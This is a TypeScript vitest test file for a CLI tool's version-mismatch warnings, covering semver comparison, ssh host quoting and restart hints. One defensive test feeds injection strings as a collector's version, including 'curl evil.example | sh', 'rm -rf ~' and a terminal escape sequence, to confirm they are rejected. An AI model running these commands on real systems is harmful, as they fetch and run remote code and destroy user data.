import { describe, expect, it } from "vitest";
import {
  collectorVersionWarning,
  incompatibilityText,
  versionWarning,
} from "../remote-version";

describe("versions here and there", () => {
  it("says nothing when they match", () => {
    expect(versionWarning("bastion", "0.2.0", "0.2.0")).toBeUndefined();
  });

  // The older one is updated, to the newer one's version, wherever it is.
  it("warns with the command for the older one, there or here", () => {
    expect(versionWarning("bastion", "0.1.0", "0.2.0")).toBe(
      "warning: bastion has ephor 0.1.0, this computer ephor 0.2.0. It " +
        "works, but keep them the same; update it on bastion:\n" +
        "  ssh bastion npm i -g ephorate@0.2.0",
    );
    expect(versionWarning("bastion", "1.0.0", "0.9.3")).toBe(
      "warning: bastion has ephor 1.0.0, this computer ephor 0.9.3. It " +
        "works, but keep them the same; update it on this computer:\n" +
        "  npm i -g ephorate@1.0.0",
    );
  });

  it("compares by number, not as text", () => {
    expect(versionWarning("bastion", "0.10.0", "0.9.0")).toContain(
      "update it on this computer",
    );
  });

  it("puts the command to copy on the last line, alone", () => {
    const text = incompatibilityText("bastion", "0.1.0", "0.2.0");

    expect(text).toBe(
      "bastion has ephor 0.1.0, this computer ephor 0.2.0. Update it on " +
        "bastion, then run this again:\n  ssh bastion npm i -g ephorate@0.2.0",
    );
  });

  // A link lost reads no version either: no claim which one is older.
  it("says the version there could not be read, and how to level it", () => {
    expect(incompatibilityText("bastion", undefined, "0.2.0")).toBe(
      "The version of ephor on bastion could not be read; this computer " +
        "has ephor 0.2.0. Update it on bastion, then run this again:\n" +
        "  ssh bastion npm i -g ephorate@0.2.0",
    );
  });

  // semver: a release is newer than its candidates, rc.10 than rc.9.
  it("orders suffixes as semver does", () => {
    expect(versionWarning("bastion", "1.0.0", "1.0.0-rc.1")).toContain(
      "update it on this computer:\n  npm i -g ephorate@1.0.0",
    );
    expect(versionWarning("bastion", "1.0.0-rc.1", "1.0.0")).toContain(
      "update it on bastion",
    );
    expect(versionWarning("bastion", "1.0.0-rc.10", "1.0.0-rc.9")).toContain(
      "update it on this computer",
    );
  });

  it("names another build when the versions read the same", () => {
    expect(incompatibilityText("bastion", "0.2.0", "0.2.0")).toContain(
      "as this computer does, yet a different build",
    );
  });

  // ssh took the address as typed; a shell must get it as one word.
  it("keeps an ssh:// address as typed, and quotes an odd one", () => {
    expect(
      incompatibilityText("ssh://bruce@203.0.113.5:3948", "0.1.0", "0.2.0"),
    ).toContain("ssh ssh://bruce@203.0.113.5:3948 npm i -g ephorate@0.2.0");
    expect(incompatibilityText("my bastion", "0.1.0", "0.2.0")).toContain(
      "ssh 'my bastion' npm i -g",
    );
    // Measured: zsh globs `[…]`, "no matches found".
    expect(incompatibilityText("bruce@[::1]", "0.1.0", "0.2.0")).toContain(
      "ssh 'bruce@[::1]' npm i -g",
    );
  });

  it("says nothing for a collector of this version, or of none said", () => {
    expect(collectorVersionWarning({}, "0.2.0", "0.2.0")).toBeUndefined();
    expect(
      collectorVersionWarning({ remote: "bastion" }, undefined, "0.2.0"),
    ).toBeUndefined();
  });

  // Here, an older serve is one left running across an upgrade.
  it("tells a serve here to restart, or this command to catch up", () => {
    expect(collectorVersionWarning({}, "0.1.0", "0.2.0", "linux")).toBe(
      "warning: the ephor serve here runs ephor 0.1.0, this command ephor " +
        "0.2.0: restart it to run this one:\n" +
        "  systemctl --user restart ephor     (or stop it and `ephor serve` again)",
    );
    // Not Linux: a serve in a tab is stopped by hand.
    expect(collectorVersionWarning({}, "0.1.0", "0.2.0", "darwin")).toContain(
      "\n  stop it (Ctrl-C in its tab) and run `ephor serve` again",
    );
    expect(collectorVersionWarning({}, "0.3.0", "0.2.0")).toBe(
      "warning: the ephor serve here runs ephor 0.3.0, this command ephor " +
        "0.2.0, an older install:\n  npm i -g ephorate@0.3.0",
    );
  });

  it("names the remote and its update for a collector elsewhere", () => {
    expect(
      collectorVersionWarning({ remote: "bastion" }, "0.1.0", "0.2.0"),
    ).toContain("update it on bastion:\n  ssh bastion npm i -g ephorate@0.2.0");
  });

  // A collector's answer goes into a command to copy: a version, or none.
  it("takes nothing but a plain version from a collector", () => {
    for (const answered of [
      "9.9.9 && curl evil.example | sh",
      "9.9.9;rm -rf ~",
      "9.9.9\u001b[2J",
      null,
      42,
    ]) {
      expect(
        collectorVersionWarning({ remote: "bastion" }, answered, "0.2.0"),
      ).toBeUndefined();
    }
  });

  // Installed but not restarted reads the old version: npm alone would
  // leave the warning there for good.
  it("adds the restart for a collector elsewhere that is older", () => {
    expect(
      collectorVersionWarning({ remote: "bastion" }, "0.1.0", "0.2.0"),
    ).toContain("\n  ssh bastion systemctl --user restart ephor");
  });

  it("does not call a collector on another host the serve here", () => {
    const warning = collectorVersionWarning(
      { apiUrl: "http://198.51.100.7:31556" },
      "0.1.0",
      "0.2.0",
    );

    expect(warning).toContain(
      "the collector at http://198.51.100.7:31556 runs ephor 0.1.0",
    );
    expect(warning).not.toContain("here");
  });
});
